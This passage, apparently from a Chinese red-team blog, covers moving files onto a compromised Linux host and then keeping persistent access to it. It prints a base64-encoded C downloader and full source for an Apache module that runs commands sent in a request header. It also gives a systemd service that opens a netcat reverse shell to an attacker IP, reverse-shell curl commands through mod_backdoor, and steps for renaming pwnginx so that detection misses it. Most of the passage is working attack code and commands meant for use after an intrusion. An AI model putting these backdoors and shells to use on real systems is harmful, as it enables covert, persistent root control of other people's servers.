class="line"><span class="attribute">bChjaGFyKiB1cmwpCnsKCWludAkJCWNmZDsKCXN0cnVjdCBzb2NrYWRkcl9pbgljYWRkOwoJc3Ry</span></span><br><span class="line"><span class="attribute">dWN0IGhvc3RlbnQJCSpwVVJMID0gTlVMTDsKCWNoYXIJCQlob3N0W0JVRlNJWkVdLCBHRVRbQlVG</span></span><br><span class="line"><span class="attribute">U0laRV07CgljaGFyCQkJcmVxdWVzdFtCVUZTSVpFXTsKCWNoYXIJCQl0ZXh0W0JVRlNJWkVdID0g</span></span><br><span class="line"><span class="attribute">ezB9OwoKCS8v5YiG56a75Li75py65Lit55qE5Li75py65Zyw5Z2A5ZKM55u45a</span>+<span class="number">56</span>Lev<span class="number">5</span>b<span class="number">6</span>ECglt</span><br><span class="line"><span class="attribute">ZW1zZXQoaG9zdCwgMCwgQlVGU0laRSk7CgltZW1zZXQoR0VULCAwLCBCVUZTSVpFKTsKCW1lbXNl</span></span><br><span class="line"><span class="attribute">dChyZXF1ZXN0LCAwLCBCVUZTSVpFKTsKCW1lbXNldCh0ZXh0LCAwLCBCVUZTSVpFKTsKCQoJc3Nj</span></span><br><span class="line"><span class="attribute">YW5mKHVybCwgIiUqW14vL10vLyVbXi9dJXMiLCBob3N0LCBHRVQpOwoKCXByaW50ZigiR0VUID0g</span></span><br><span class="line"><span class="attribute">JXNcbiIsIEdFVCk7CglwcmludGYoImhvc3QgPSAlc1xuIiwgaG9zdCk7CglwcmludGYoInVybCA9</span></span><br><span class="line"><span class="attribute">ICVzXG4iLCB1cmwpOwoKCS8v6K6</span>+<span class="number">572</span>uc<span class="number">29</span>ja<span class="number">2</span>V<span class="number">05</span>Y+C<span class="number">5</span>pWwCglpZiAoLTEgPT<span class="number">0</span>gKGNmZCA<span class="number">9</span>IHNv</span><br><span class="line"><span class="attribute">Y2tldCggQUZfSU5FVCwgU09DS19TVFJFQU0sIDApKSkKCXsKCQlwcmludGYoICJjcmVhdGUgc29j</span></span><br><span class="line"><span class="attribute">a2V0IGZhaWxlZCBvZiBjbGllbnQhXG4iICk7CgkJcmV0dXJuIC0xOwoJfQoKCS8v5bCG5LiK6Z2i</span></span><br><span class="line"><span class="attribute">6I635b6X55qE5Li75py65L</span>+h<span class="number">5</span>oGv<span class="number">6</span>YCa<span class="number">6</span>L+H<span class="number">5</span>Z+f<span class="number">5</span>ZCN<span class="number">6</span>Kej<span class="number">5</span>p<span class="number">6</span>Q<span class="number">5</span>Ye<span class="number">95</span>pWw<span class="number">6</span>I<span class="number">635</span>b<span class="number">6</span>X<span class="number">5</span>Z+f<span class="number">5</span>ZCN</span><br><span class="line"><span class="attribute">5L</span>+h<span class="number">5</span>oGvCglwVVJMID<span class="number">0</span>gZ<span class="number">2</span>V<span class="number">0</span>aG<span class="number">9</span>zdGJ<span class="number">5</span>bmFtZShob<span class="number">3</span>N<span class="number">0</span>KTsKCgkvL+iuvue<span class="number">9</span>rklQ<span class="number">5</span>Zyw<span class="number">5</span>Z<span class="number">2</span>A<span class="number">57</span>uT</span><br><span class="line"><span class="attribute">5p6ECgliemVybygmY2FkZCwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOwoJY2FkZC5zaW5f</span></span><br><span class="line"><span class="attribute">ZmFtaWx5CQkJPSBBRl9JTkVUOwoJY2FkZC5zaW5fYWRkci5zX2FkZHIJPSAqKCh1bnNpZ25lZCBs</span></span><br><span class="line"><span class="attribute">b25nICopcFVSTC0</span>+aF<span class="number">9</span>hZGRyX<span class="number">2</span>xpc<span class="number">3</span>RbMF<span class="number">0</span>pOwoJY<span class="number">2</span>FkZC<span class="number">5</span>zaW<span class="number">5</span>fcG<span class="number">9</span>ydAkJCT<span class="number">0</span>gaHRvbnMoODAp</span><br><span class="line"><span class="attribute">OwoJCgkvL</span>+WQkUhUVFDmnI<span class="number">3</span>liqHlmajlj<span class="number">5</span>HpgIFVUkzkv<span class="number">6</span>Hmga<span class="number">8</span>KCXNucHJpbnRmKHJlcXVlc<span class="number">3</span>Qs</span><br><span class="line"><span class="attribute">IEJVRlNJWkUsIAkJXAoJCQkJIkdFVCAlcyBIVFRQLzEuMVxyXG4iCgkJCQkiSE9TVDogJXNcclxu</span></span><br><span class="line"><span class="attribute">IgoJCQkJIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlXHJcbiIKCQkJCSJDb25uZWN0aW9uOiBjbG9z</span></span><br><span class="line"><span class="attribute">ZVxyXG5cclxuIiwKCQkJCUdFVCxob3N0KTsKCglwcmludGYoIlxucmVxdWVzdCA9IFxuJXNcbiIs</span></span><br><span class="line"><span class="attribute">IHJlcXVlc3QpOwoJCgkvL</span>+i/nuaOpeacjeWKoeWZqAoJaWYgKC<span class="number">0</span>xID<span class="number">09</span>IGNvbm<span class="number">5</span>lY<span class="number">3</span>QoY<span class="number">2</span>ZkLCAo</span><br><span class="line"><span class="attribute">c3RydWN0IHNvY2thZGRyICopJmNhZGQsIChzb2NrbGVuX3Qpc2l6ZW9mKGNhZGQpKSkKCXsKCQlw</span></span><br><span class="line"><span class="attribute">cmludGYoICJjb25uZWN0IGZhaWxlZCBvZiBjbGllbnQhXG4iICk7CgkJcmV0dXJuIC0xOwoJfQoK</span></span><br><span class="line"><span class="attribute">CS8v5ZCR5pyN5Yqh5Zmo5Y</span>+R<span class="number">6</span>YCBdXJs<span class="number">6</span>K+<span class="number">35</span>rGC<span class="number">55</span>qEcmVxdWVzdAoJaWYgKC<span class="number">0</span>xID<span class="number">09</span>c<span class="number">2</span>VuZChj</span><br><span class="line"><span class="attribute">ZmQsIHJlcXVlc3QsIHN0cmxlbiggcmVxdWVzdCApLCAwICkpCgl7CgkJcHJpbnRmKCAi5ZCR5pyN</span></span><br><span class="line"><span class="attribute">5Yqh5Zmo5Y</span>+R<span class="number">6</span>YCB<span class="number">6</span>K+<span class="number">35</span>rGC<span class="number">55</span>qEcmVxdWVzdOWksei<span class="number">0</span>pSFcbiIgKTsKCQlyZXR<span class="number">1</span>cm<span class="number">4</span>gLTE<span class="number">7</span>Cgl<span class="number">9</span></span><br><span class="line"><span class="attribute">CgoJLy</span>/lrqLmiLfnq<span class="number">6</span>/mjqXmlLbmnI<span class="number">3</span>liqHlmajnmoTov<span class="number">5</span>Tlm<span class="number">57</span>kv<span class="number">6</span>Hmga<span class="number">8</span>KCWdldEh<span class="number">0</span>dHBIZWFk</span><br><span class="line"><span class="attribute">KGNmZCwgdGV4dCwgc2l6ZW9mKHRleHQpKTsKCXByaW50ZigiaGVhZCA9IDpcbiVzXG4iLCB0ZXh0</span></span><br><span class="line"><span class="attribute">KTsKCQoJcmV0dXJuIGNmZDsKfQoKCi8qKgogKiBAYnJpZWYg6I635Y</span>+WVVJM<span class="number">5</span>Lit<span class="number">55</span>qE<span class="number">5</span>paH<span class="number">5</span>Lu<span class="number">2</span></span><br><span class="line"><span class="attribute">5ZCNCiAqCiAqIEBwYXJhbSBVUkxQYXRoIFtpbl0gCVVSTOWcsOWdgAogKgogKiBAcmV0dXJuIOaW</span></span><br><span class="line"><span class="attribute">h</span>+S<span class="number">7</span>tuWQjQogKi<span class="number">8</span>KY<span class="number">2</span>hhciAqR<span class="number">2</span>V<span class="number">0</span>RmlsZU<span class="number">5</span>hbWUoY<span class="number">2</span>hhciAqVVJMUGF<span class="number">0</span>aCkKewogICAgY<span class="number">2</span>hhciBj</span><br><span class="line"><span class="attribute">aCA9ICcvJzsKICAgIGNoYXIgKnEgPSBzdHJyY2hyKFVSTFBhdGgsIGNoKSArIDE7CgogICAgcmV0</span></span><br><span class="line"><span class="attribute">dXJuIHE7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyKiBhcmd2W10pCnsKCWludCBzb2NrZmQg</span></span><br><span class="line"><span class="attribute">PSAtMTsKCWNoYXIJCWJ1ZltCVUZTSVpFXSA9IHswfTsKCWNoYXIJCWZpbGVOYW1lW0JVRlNJWkVd</span></span><br><span class="line"><span class="attribute">ID0gezB9OwoJaW50CQkJZmQgPSAtMTsKCQoJaWYgKCBhcmdjIDwgMiApCgl7CgkJcHJpbnRmKCAi</span></span><br><span class="line"><span class="attribute">55So5rOVOiVzIHVybOe9kemhtee9keWdgFxuIiwgYXJndlswXSApOwoJCXJldHVybiAtMTsKCX0K</span></span><br><span class="line"><span class="attribute">CQoJc3RybmNweShmaWxlTmFtZSwgR2V0RmlsZU5hbWUoYXJndlsxXSksIEJVRlNJWkUpOwoJc29j</span></span><br><span class="line"><span class="attribute">a2ZkID0gZ2V0dXJsKGFyZ3ZbMV0pOwoJCglwcmludGYoImZpbGVOYW1lID0gJXNcbiIsIGZpbGVO</span></span><br><span class="line"><span class="attribute">YW1lKTsKCXJlbW92ZShmaWxlTmFtZSk7CgkKCWZkID0gb3BlbihmaWxlTmFtZSwgT19XUk9OTFkg</span></span><br><span class="line"><span class="attribute">fCBPX0NSRUFULCA3NzcgKTsKCWlmKGZkID09IC0xKQoJewoJCXBlcnJvciggIk9QZW4gZXJyb3Ii</span></span><br><span class="line"><span class="attribute">ICk7CgkJcmV0dXJuIC0xOwoJfQoJCgl3aGlsZSAoMSkKCXsKCQltZW1zZXQoIGJ1ZiwgMCwgQlVG</span></span><br><span class="line"><span class="attribute">U0laRSApOwoJCWludCBjcjsKCQljciA9IHJlY3Yoc29ja2ZkLCBidWYsIEJVRlNJWkUsIDApOwoJ</span></span><br><span class="line"><span class="attribute">CWlmICggY3IgPD0gMCApCgkJewoJCQlwcmludGYoImJyZWFrXG4iKTsKCQkJYnJlYWs7CgkJfQoJ</span></span><br><span class="line"><span class="attribute">CXdyaXRlKGZkLCBidWYsIGNyKTsKCX0KCQoJY2xvc2UoZmQpOwoJY2xvc2Uoc29ja2ZkKTsKCXJl</span></span><br><span class="line"><span class="attribute">dHVybiAwOwp9CgoK</span></span><br></pre></td></tr></table></figure>

<p>我们在RCE漏洞下执行如下命令将上述base64字符串写入</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;xxxxx&quot;</span> &gt; shadowget.txt</span><br><span class="line"></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># base64 -d shadowget.txt &gt; shadowget.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># gcc -o shadowget shadowget.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># ./shadowget http://172.16.42.151/aa.php</span></span><br><span class="line">GET = <span class="string">/aa.php</span></span><br><span class="line">host = 172.16.42.151</span><br><span class="line">url = http:<span class="string">//172.16.42.151/aa.php</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line">fileName = aa.php</span><br><span class="line">break</span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># ls</span></span><br><span class="line">1.txt  aa.php shadowget.txt shadowget.c shadowget</span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>使用<code>./shadowget http://172.16.42.151/aa.php</code>成功下载了aa.php</p>
<h2 id="python脚本下载"><a href="#python脚本下载" class="headerlink" title="python脚本下载"></a>python脚本下载</h2><p>跟上述方法一样转为base64写入</p>
<ul>
<li>a.py</li>
</ul>
<figure class="highlight qml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"><span class="built_in">url</span> = <span class="string">&#x27;http://172.16.42.151/aa.php&#x27;</span>  </span><br><span class="line">urllib.urlretrieve(<span class="built_in">url</span>, <span class="string">&quot;aa.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>最后执行<code>python a.py</code></p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@vuln /tmp]<span class="comment"># ls</span></span><br><span class="line">aa.php</span><br><span class="line">[root@vuln /tmp]<span class="comment"># python a.py</span></span><br><span class="line">[root@vuln /tmp]<span class="comment"># ls</span></span><br><span class="line">aa.php  a.py</span><br></pre></td></tr></table></figure>



<h2 id="使用nc传输"><a href="#使用nc传输" class="headerlink" title="使用nc传输"></a>使用nc传输</h2><p>vps作为服务端</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">33033</span> &lt; aa.php</span><br></pre></td></tr></table></figure>

<p>靶机作为客户端下载</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">172.16.42.150</span> <span class="number">33033</span> &gt; aa.php</span><br></pre></td></tr></table></figure>

<p>靶机下载完后后关闭</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># ls</span></span><br><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># nc 172.16.42.150 33033 &gt; aa.ph</span></span><br><span class="line">^C</span><br><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># cat aa.php</span></span><br><span class="line">sdfsdfsdf</span><br></pre></td></tr></table></figure>



<h2 id="使用curl命令下载"><a href="#使用curl命令下载" class="headerlink" title="使用curl命令下载"></a>使用curl命令下载</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>/aa.php -o aa</span><br></pre></td></tr></table></figure>



<h2 id="使用wget命令下载"><a href="#使用wget命令下载" class="headerlink" title="使用wget命令下载"></a>使用wget命令下载</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>/aa.php</span><br></pre></td></tr></table></figure>







<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codeleading.com/article/62605839291/">https://www.codeleading.com/article/62605839291/</a></p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>Linux安全</tag>
        <tag>红队技术</tag>
      </tags>
  </entry>
  <entry>
    <title>linux持久化</title>
    <url>/linux%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    <content><![CDATA[<blockquote>
<p>无我相，无人相，无众生相，无寿者相。</p>
</blockquote>
<p>在我们入侵目标系统后，我们希望留下一个后门，方便我们下次入侵，比如写一个定时任务来反弹shell。</p>
<span id="more"></span>

<h2 id="1-Apache-模块后门"><a href="#1-Apache-模块后门" class="headerlink" title="1. Apache 模块后门"></a>1. Apache 模块后门</h2><blockquote>
<p>靶机：172.16.42.151     hostname:vuln</p>
<p>攻击机：172.16.42.1     hostname:ShadowOS</p>
</blockquote>
<p>项目地址：<a href="https://github.com/VladRico/apache2_BackdoorMod">https://github.com/VladRico/apache2_BackdoorMod</a></p>
<p>mod_backdoor is a stealth backdoor using an Apache2 module.<br>The main idea is to fork() the primary Apache2 process just after it has loaded its config. Since it’s forked before the root user transfers the process to www-data, you can execute command as root.<br>As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this forked root apache2 process, to let us interact as root with the compromised system.</p>
<p>环境搭建</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@vuln ~]<span class="comment"># apt install apache2</span></span><br><span class="line">[root@vuln ~]<span class="comment"># git clone https://github.com/VladRico/apache2_BackdoorMod</span></span><br><span class="line">[root@vuln ~]<span class="comment"># cd apache2_BackdoorMod</span></span><br><span class="line">[root@vuln apache2_BackdoorMod]<span class="comment"># cd build</span></span><br><span class="line">[root@vuln build]<span class="comment"># cp backdoor.load /usr/lib/apache2/modules</span></span><br><span class="line">[root@vuln build]<span class="comment"># cp mod_backdoor.so /usr/lib/apache2/modules</span></span><br><span class="line">[root@vuln build]<span class="comment"># cp backdoor.load /etc/apache2/mods-available</span></span><br><span class="line">[root@vuln build]<span class="comment"># a2enmod backdoor</span></span><br><span class="line">[root@vuln build]<span class="comment"># systemctl restart apache2</span></span><br></pre></td></tr></table></figure>

<p>攻击</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">shadowflow@ShadowOS ~</span>]% curl -H <span class="string">&#x27;Cookie: password=backdoor&#x27;</span> http:<span class="comment">//172.16.42.151/ping</span></span><br><span class="line">[<span class="meta">+</span>] Backdoor module <span class="keyword">is</span> running !</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% nc -lvvp <span class="number">1337</span></span><br><span class="line">[shadowflow@ShadowOS ~]% curl -H <span class="string">&#x27;Cookie: password=backdoor&#x27;</span> http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span><span class="regexp">/reverse/</span><span class="number">172.16</span>.<span class="number">42.1</span><span class="regexp">/1337/</span>bash</span><br><span class="line">[+] Sending Reverse Shell to <span class="number">172.16</span>.<span class="number">42.1</span>:<span class="number">1337</span> using bash</span><br></pre></td></tr></table></figure>



<p>修改密码</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[root<span class="title">@vuln</span> apache<span class="number">2</span>_BackdoorMod]# vim mod_backdoor.<span class="keyword">c</span></span><br><span class="line">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;password=shadowtest&quot;</span></span><br><span class="line"></span><br><span class="line">#重新生成so文件</span><br><span class="line">apt install apache<span class="number">2</span>-dev</span><br><span class="line">apxs -i -a -<span class="keyword">c</span> mod_backdoor.<span class="keyword">c</span> sblist.<span class="keyword">c</span> sblist_delete.<span class="keyword">c</span> server.<span class="keyword">c</span> -Wl<span class="punctuation">,</span>-lutil</span><br><span class="line"></span><br><span class="line">[shadowflow<span class="title">@ShadowOS</span> ~]% curl -H &#x27;Cookie: password<span class="operator">=</span>shadowtest&#x27; http://<span class="number">172.16</span>.<span class="number">42.151</span>/ping</span><br><span class="line">[+] Backdoor <span class="keyword">module</span> is running !</span><br></pre></td></tr></table></figure>



<h3 id="1-1-手动构造apache-module后门"><a href="#1-1-手动构造apache-module后门" class="headerlink" title="1.1 手动构造apache module后门"></a>1.1 手动构造apache module后门</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;httpd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;http_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;http_protocol.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ap_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The sample content handler */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">shadowtest_handler</span><span class="params">(request_rec *r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">apr_array_header_t</span>    *fields;</span><br><span class="line">    <span class="keyword">int</span>                         i;</span><br><span class="line">    <span class="keyword">apr_table_entry_t</span>           *e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> FLAG = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</span></span><br><span class="line"></span><br><span class="line">    fields = apr_table_elts(r-&gt;headers_in);</span><br><span class="line">    e = (<span class="keyword">apr_table_entry_t</span> *) fields-&gt;elts;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; fields-&gt;nelts; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(e[i].key, <span class="string">&quot;Shadowtest&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            FLAG = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FLAG)&#123;</span><br><span class="line">        <span class="keyword">char</span> * command = e[i].val;</span><br><span class="line">        FILE* fp = popen(command,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> counter = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(counter)&#123;</span><br><span class="line">            counter = fread(buffer, <span class="number">1</span>, <span class="keyword">sizeof</span>(buffer), fp);</span><br><span class="line">            ap_rwrite(buffer, counter, r);</span><br><span class="line">        &#125;</span><br><span class="line">        pclose(fp);</span><br><span class="line">        <span class="keyword">return</span> DONE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DECLINED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shadowtest_register_hooks</span><span class="params">(<span class="keyword">apr_pool_t</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ap_hook_handler(shadowtest_handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_MIDDLE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dispatch list for API hooks */</span></span><br><span class="line"><span class="keyword">module</span> AP_MODULE_DECLARE_DATA shadowtest_module = &#123;</span><br><span class="line">    STANDARD20_MODULE_STUFF,</span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* create per-dir    config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* merge  per-dir    config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* create per-server config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* merge  per-server config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* table of config file commands       */</span></span><br><span class="line">    shadowtest_register_hooks  <span class="comment">/* register hooks                      */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># apxs -i -a -c mod_shadowtest.c</span></span><br><span class="line">......</span><br><span class="line">chmod <span class="number">644</span> /usr/lib/apache2/modules/mod_shadowtest.so</span><br><span class="line">[preparing <span class="class"><span class="keyword">module</span> `<span class="title">shadowtest</span>&#x27; <span class="title">in</span> /<span class="title">etc</span>/<span class="title">apache2</span>/<span class="title">mods</span>-<span class="title">available</span>/<span class="title">shadowtest</span>.<span class="title">load</span>]</span></span><br><span class="line">Module shadowtest already enable</span><br><span class="line"></span><br><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># systemctl restart apache2</span></span><br></pre></td></tr></table></figure>

<p>攻击机执行</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl -H <span class="string">&#x27;Shadowtest: id&#x27;</span> <span class="string">&#x27;http://172.16.42.151/x&#x27;</span></span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>



<h2 id="2-Systemd后门"><a href="#2-Systemd后门" class="headerlink" title="2. Systemd后门"></a>2. Systemd后门</h2><h3 id="2-1-Systemd服务"><a href="#2-1-Systemd服务" class="headerlink" title="2.1 Systemd服务"></a>2.1 Systemd服务</h3><p>Systemd服务基本格式</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span>   </span><br><span class="line"><span class="attr">Description</span>=test   		<span class="comment"># 简单描述服务</span></span><br><span class="line"><span class="attr">After</span>=network.target    <span class="comment"># 描述服务类别，表示本服务需要在network服务启动后在启动</span></span><br><span class="line"><span class="attr">Before</span>=xxx.service      <span class="comment"># 表示需要在某些服务启动之前启动，After和Before字段只涉及启动顺序，不涉及依赖关系。</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span> </span><br><span class="line"><span class="attr">Type</span>=forking     		<span class="comment"># 设置服务的启动方式</span></span><br><span class="line"><span class="attr">User</span>=USER        		<span class="comment"># 设置服务运行的用户</span></span><br><span class="line"><span class="attr">Group</span>=USER       		<span class="comment"># 设置服务运行的用户组</span></span><br><span class="line"><span class="attr">WorkingDirectory</span>=/PATH	<span class="comment"># 设置服务运行的路径(cwd)</span></span><br><span class="line"><span class="attr">KillMode</span>=control-group  <span class="comment"># 定义systemd如何停止服务</span></span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">no</span>        		<span class="comment"># 定义服务进程退出后，systemd的重启方式，默认是不重启</span></span><br><span class="line"><span class="attr">ExecStart</span>=/start.sh    	<span class="comment"># 服务启动命令，命令需要绝对路径（采用sh脚本启动其他进程时Type须为forking）</span></span><br><span class="line">   </span><br><span class="line"><span class="section">[Install]</span>   </span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target  <span class="comment"># 多用户</span></span><br></pre></td></tr></table></figure>

<p>完成service脚本编写后，需要执行以下命令以重载生效：</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重新加载所有的systemd服务</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 管理服务 [使能开启启动|启动|停止|重启|查看状态]</span></span><br><span class="line">sudo systemctl [enable|<span class="string">start</span>|<span class="string">stop</span>|<span class="string">restart</span>|<span class="string">status] xxx.service</span></span><br></pre></td></tr></table></figure>

<p>一个服务设置为开机启动使用会将 /usr/lib/systemd/system/name.service 软链接到 /etc/systemd/system/ ，但是 enable 命令不会重写已经存在的链接，所以当我们修改了服务文件就需要重新加载：systemctl reenable name.service</p>
<h3 id="2-2-构造System后门"><a href="#2-2-构造System后门" class="headerlink" title="2.2 构造System后门"></a>2.2 构造System后门</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln systemd]# vim <span class="regexp">/usr/</span>lib<span class="regexp">/systemd/</span>system/shadowtest.service</span><br></pre></td></tr></table></figure>

<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=ShadowTestx</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">ExecStart</span>=/usr/bin/netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">1337</span> -e /bin/bash</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br><span class="line"><span class="attr">RestartSec</span>=<span class="number">42</span>s</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> systemd]<span class="meta"># systemctl enable shadowtest</span></span><br><span class="line">[root<span class="symbol">@vuln</span> systemd]<span class="meta"># systemctl start shadowtest</span></span><br></pre></td></tr></table></figure>



<h2 id="3-Nginx后门"><a href="#3-Nginx后门" class="headerlink" title="3. Nginx后门"></a>3. Nginx后门</h2><h3 id="3-1-nginx模块后门"><a href="#3-1-nginx模块后门" class="headerlink" title="3.1 nginx模块后门"></a>3.1 nginx模块后门</h3><p>查看当前nginx服务版本</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@vuln <span class="built_in">module</span>]<span class="comment"># nginx -V</span></span><br><span class="line">nginx version: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>下载pwnginx</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/t57root/</span>pwnginx.git</span><br></pre></td></tr></table></figure>

<p><strong>修改特征</strong></p>
<ul>
<li><p>修改名称防止被检。使用vscode将所有pwnginx替换为了shadownginx</p>
</li>
<li><p>t57root替换为shadowtest123</p>
</li>
<li><p>所有文件名称pwnginx关键字替换</p>
</li>
</ul>
<p>下载对应版本的nginx</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>nginx.org<span class="regexp">/download/</span>nginx-<span class="number">1.14</span>.<span class="number">2</span>.tar.gz</span><br></pre></td></tr></table></figure>

<p>编译恶意模块的nginx</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">[root<span class="title">@vuln</span> nginx<span class="number">-1.14</span>.<span class="number">2</span>]# ./configure --without-http_rewrite_module --<span class="keyword">add</span>-<span class="keyword">module</span><span class="operator">=</span>../shadownginx/<span class="keyword">module</span></span><br><span class="line">[root<span class="title">@vuln</span> nginx<span class="number">-1.14</span>.<span class="number">2</span>]# make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>启动ng</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@vuln nginx-<span class="number">1.14</span>.<span class="number">2</span>]# <span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>sbin<span class="regexp">/nginx -c /u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>

<p>pwnginx的客户端我们刚刚已经替换了文本，现在需要重新编译，不能用之前的了，执行make即可编译</p>
